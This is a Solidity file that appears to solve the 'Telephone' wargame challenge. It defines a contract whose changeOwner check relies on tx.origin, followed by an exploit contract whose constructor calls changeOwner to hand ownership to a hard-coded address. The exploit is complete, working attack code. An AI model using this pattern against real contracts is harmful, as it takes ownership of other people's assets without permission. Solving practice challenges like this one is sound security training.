// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

contract TelephoneExploit {
    constructor(address _telephone) {
        Telephone telephone = Telephone(_telephone);
        address offender = address(0xa0Ee7A142d267C1f36714E4a8F75612F20a79720);
        telephone.changeOwner(offender);
        require(telephone.owner() == offender);
    }
}
